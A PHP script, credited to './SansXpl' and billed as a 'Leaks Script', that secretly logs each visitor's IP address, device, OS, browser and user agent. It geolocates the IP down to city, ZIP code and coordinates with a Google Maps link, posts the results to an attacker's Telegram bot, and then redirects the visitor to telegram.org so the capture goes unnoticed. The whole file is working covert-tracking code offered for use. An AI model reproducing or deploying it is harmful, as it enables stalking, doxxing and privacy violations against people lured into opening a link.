<?php
$redirect = "https://telegram.org";  //bisa diubah mau redirect kemana. contoh http://whatsapp.com/

$token = "00000000:XXXXXXXXXXXXXXXXXXXXXXX"; //token bot telegram
$chat_id = "000000000"; //chat id

/*
  Leaks Script by ./SansXpl
  github.com/SANSDESU
*/

$ip = UserInfo::get_ip();
$device = UserInfo::get_device();
$os = UserInfo::get_os();
$browser = UserInfo::get_browser();

$messages = "";
$messages .= "=====[ Device Information ]=====\n";
$messages .= "Device⠀⠀⠀ : $device\n";
$messages .= "OS⠀⠀⠀⠀⠀⠀: $os\n";
$messages .= "Browser⠀⠀ : $browser\n";
$messages .= "User Agent : ".$_SERVER['HTTP_USER_AGENT'] ."\n";

$messages .= "\n=====[ Network Information ]=====\n";
$urls = "http://ip-api.com/php/$ip?fields=66846719";
$data = unserialize(file_get_contents($urls));

$field_labels = [
    "query" => "IP⠀⠀⠀⠀⠀⠀⠀⠀⠀  ",
    "continent" => "Continent⠀⠀⠀⠀  ",
    "continentCode" => "Continent Code  ",
    "country" => "Country⠀⠀⠀⠀⠀⠀",
    "countryCode" => "Country Code⠀⠀",
    "region" => "Region⠀⠀⠀⠀⠀⠀  ",
    "regionName" => "Region Name⠀⠀ ",
    "city" => "City⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    "district" => "District⠀⠀⠀⠀⠀⠀  ",
    "zip" => "ZIP⠀⠀⠀⠀⠀⠀⠀⠀⠀ ",
    "lat" => "Latitude⠀⠀⠀⠀⠀⠀",
    "lon" => "Longitude⠀⠀⠀⠀⠀",
    "timezone" => "Timezone⠀⠀⠀⠀⠀",
    "offset" => "Offset⠀⠀⠀⠀⠀⠀⠀ ",
    "currency" => "Currency⠀⠀⠀⠀⠀  ",
    "isp" => "ISP⠀⠀⠀⠀⠀⠀⠀⠀⠀ ",
    "org" => "Organization⠀⠀⠀",
    "as" => "AS⠀⠀⠀⠀⠀⠀⠀⠀⠀  ",
    "asname" => "AS Name⠀⠀⠀⠀⠀ ",
    "reverse" => "Reverse⠀⠀⠀⠀⠀⠀ ",
    "mobile" => "Mobile⠀⠀⠀⠀⠀⠀⠀ ",
    "proxy" => "Proxy⠀⠀⠀⠀⠀⠀⠀⠀",
    "hosting" => "Hosting⠀⠀⠀⠀⠀ ⠀",
];

foreach ($field_labels as $key => $label) {

       if ($key === 'mobile' || $key === 'proxy' || $key === 'hosting') {
            $value = $data[$key] ? 'Yes' : 'No';
        } else if (empty($data[$key])){
            $value = "Unknown";
        } else {
            $value = $data[$key];
        }

       $messages .= $label . ": " . $value . "\n";
}

$coordinate = $data["lat"] . "," . $data["lon"];
$messages .= "Google Maps⠀⠀  : https://www.google.com/maps/@$coordinate";
$messages .= "\n\nLeaks by ./SansXpl";
$params = [
    "chat_id" => $chat_id,
    "text" => $messages,
];

$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);

curl_close($ch);

echo "<script>location.href='$redirect';</script>";

class UserInfo{

	private static function get_user_agent() {
		return  $_SERVER['HTTP_USER_AGENT'];
	}

	public static function get_ip() {
		$mainIp = '';
		if (getenv('HTTP_CLIENT_IP'))
			$mainIp = getenv('HTTP_CLIENT_IP');
		else if(getenv('HTTP_X_FORWARDED_FOR'))
			$mainIp = getenv('HTTP_X_FORWARDED_FOR');
		else if(getenv('HTTP_X_FORWARDED'))
			$mainIp = getenv('HTTP_X_FORWARDED');
		else if(getenv('HTTP_FORWARDED_FOR'))
			$mainIp = getenv('HTTP_FORWARDED_FOR');
		else if(getenv('HTTP_FORWARDED'))
			$mainIp = getenv('HTTP_FORWARDED');
		else if(getenv('REMOTE_ADDR'))
			$mainIp = getenv('REMOTE_ADDR');
		else
			$mainIp = 'UNKNOWN';
		return $mainIp;
	}

	public static function get_os() {

		$user_agent = self::get_user_agent();
		$os_platform    =   "Unknown OS Platform";
		$os_array       =   array(
			'/windows nt 10/i'     	=>  'Windows 10',
			'/windows nt 6.3/i'     =>  'Windows 8.1',
			'/windows nt 6.2/i'     =>  'Windows 8',
			'/windows nt 6.1/i'     =>  'Windows 7',
			'/windows nt 6.0/i'     =>  'Windows Vista',
			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
			'/windows nt 5.1/i'     =>  'Windows XP',
			'/windows xp/i'         =>  'Windows XP',
			'/windows nt 5.0/i'     =>  'Windows 2000',
			'/windows me/i'         =>  'Windows ME',
			'/win98/i'              =>  'Windows 98',
			'/win95/i'              =>  'Windows 95',
			'/win16/i'              =>  'Windows 3.11',
			'/macintosh|mac os x/i' =>  'Mac OS X',
			'/mac_powerpc/i'        =>  'Mac OS 9',
			'/linux/i'              =>  'Linux',
			'/ubuntu/i'             =>  'Ubuntu',
			'/iphone/i'             =>  'iPhone',
			'/ipod/i'               =>  'iPod',
			'/ipad/i'               =>  'iPad',
			'/android/i'            =>  'Android',
			'/blackberry/i'         =>  'BlackBerry',
			'/webos/i'              =>  'Mobile'
		);

		foreach ($os_array as $regex => $value) {
			if (preg_match($regex, $user_agent)) {
				$os_platform    =   $value;
			}
		}
		return $os_platform;
	}

	public static function  get_browser() {

		$user_agent= self::get_user_agent();

		$browser        =   "Unknown Browser";

		$browser_array  =   array(
			'/msie/i'       =>  'Internet Explorer',
			'/Trident/i'    =>  'Internet Explorer',
			'/firefox/i'    =>  'Firefox',
			'/safari/i'     =>  'Safari',
			'/chrome/i'     =>  'Chrome',
			'/edge/i'       =>  'Edge',
			'/opera/i'      =>  'Opera',
			'/netscape/i'   =>  'Netscape',
			'/maxthon/i'    =>  'Maxthon',
			'/konqueror/i'  =>  'Konqueror',
			'/ubrowser/i'   =>  'UC Browser',
			'/mobile/i'     =>  'Handheld Browser'
		);

		foreach ($browser_array as $regex => $value) {

			if (preg_match($regex, $user_agent)) {
				$browser    =   $value;
			}

		}

		return $browser;

	}

	public static function  get_device(){

		$tablet_browser = 0;
		$mobile_browser = 0;

		if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
			$tablet_browser++;
		}

		if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
			$mobile_browser++;
		}

		if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
			$mobile_browser++;
		}

		$mobile_ua = strtolower(substr(self::get_user_agent(), 0, 4));
		$mobile_agents = array(
			'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
			'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
			'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
			'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
			'newt','noki','palm','pana','pant','phil','play','port','prox',
			'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
			'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
			'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
			'wapr','webc','winw','winw','xda ','xda-');

		if (in_array($mobile_ua,$mobile_agents)) {
			$mobile_browser++;
		}

		if (strpos(strtolower(self::get_user_agent()),'opera mini') > 0) {
			$mobile_browser++;
	            //Check for tablets on opera mini alternative headers
			$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
			if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
				$tablet_browser++;
			}
		}

		if ($tablet_browser > 0) {
	           // do something for tablet devices
			return 'Tablet';
		}
		else if ($mobile_browser > 0) {
	           // do something for mobile devices
			return 'Mobile';
		}
		else {
	           // do something for everything else
			return 'Computer';
		}
	}

}
